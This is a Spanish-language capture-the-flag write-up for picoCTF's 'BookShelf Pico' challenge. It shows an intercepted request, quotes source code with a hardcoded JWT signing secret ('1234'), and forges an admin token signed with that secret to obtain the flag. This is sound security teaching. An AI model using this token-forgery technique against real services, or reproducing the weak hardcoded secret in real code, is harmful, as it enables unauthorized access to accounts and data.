## Descripción
BookShelf Pico, my premium online book-reading service. I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book! Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/482/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:50423/).
## Solución
Si escuchamos con burp suite obtenemos esto:
```
GET /base/users/photo/1 HTTP/1.1
Host: saturn.picoctf.net:61791
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://saturn.picoctf.net:61791/
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc0NTQzMzI2MCwiaWF0IjoxNzQ0ODI4NDYwLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.0g4BAd2zbI3acgv5kP5U4VEtiQqz5Ge63h5txpuu8l0
DNT: 1
Connection: keep-alive
```
El JWT es este:
```JSON
{
  "role": "Free",
  "iss": "bookshelf",
  "exp": 1745433260,
  "iat": 1744828460,
  "userId": 1,
  "email": "user"
}
```
No podemos acceder al libro ya que no somos el usuario "Admin"

Si empezamos a revisar el código nos podemos encontrar con esto:
```java
// Archivo SecretGenerator
private String generateRandomString(int len) {
	// not so random
	return "1234";
}

// Archivo UserService
@PreAuthorize("#id == authentication.principal.grantedAuthorities[0].userId or hasAuthority('Admin')")
    public UserDto getUser(Integer id) throws ResourceNotFoundException {
        Optional<User> userOptional = userRepository.findById(id);
        if(!userOptional.isPresent()){
            throw new ResourceNotFoundException("User with ID '"+id+"' not found");
        }
```
Si nos vamos a la consola del navegador nos dicen esto:
```js
{id: 5, title: 'Flag', desc: 'You need to have Admin role to access this special book!', role: 'Admin'}
```
Vamos a https://jwt.io/ para modificar el JWT, y lo dejamos así:
```json
Encoded                                        Decoded
------------------------------------------     ------------------------------------
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.          HEADER: ALGORITHM & TOKEN TYPE
eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlb      {
GYiLCJleHAiOjE3NDU0MzMyNjAsImlhdCI6MTc0        "typ": "JWT",
NDgyODQ2MCwidXN1Y2tlIjoiLCJlbWFpbCI6ImF        "alg": "HS256"
kbWluIn0.IbNcsNaIBC6Gt3_V95eTuCzoIkJGLL      }
bapuPpIAbg3EI
-----------------------------------------------------------------------------------
                                               PAYLOAD: DATA
                                               {
                                                 "role": "Admin",
                                                 "iss": "bookshelf",
                                                 "exp": 1745433260,
                                                 "iat": 1744828460,
                                                 "userId": 2,
                                                 "email": "admin"
                                               }
-----------------------------------------------------------------------------------
                                               VERIFY SIGNATURE
                                               HMACSHA256(
                                                 base64UrlEncode(header) + "." + 
                                                 base64UrlEncode(payload),
                                                 1234
                                               ) secret base64 encoded
```
Si cambiamos el JWT y el payload desde la página del libro al que queremos acceder nos da esto:
```
Great job! Here’s your flag:picoCTF{w34k_jwt_n0t_g00d_d72df65e}
```
## Notas adicionales
- Si el `userId` lo ponemos en 1 no nos dará nada ya que el admin tiene otro id
- El problema fue resuelto en un navegador basado en Firefox
## Referencias
- https://www.ibm.com/docs/es/cics-ts/6.x?topic=cics-json-web-token-jwt
- https://auth0.com/learn/json-web-tokens
- https://www.ionos.com/digitalguide/websites/web-development/json-web-token-jwt/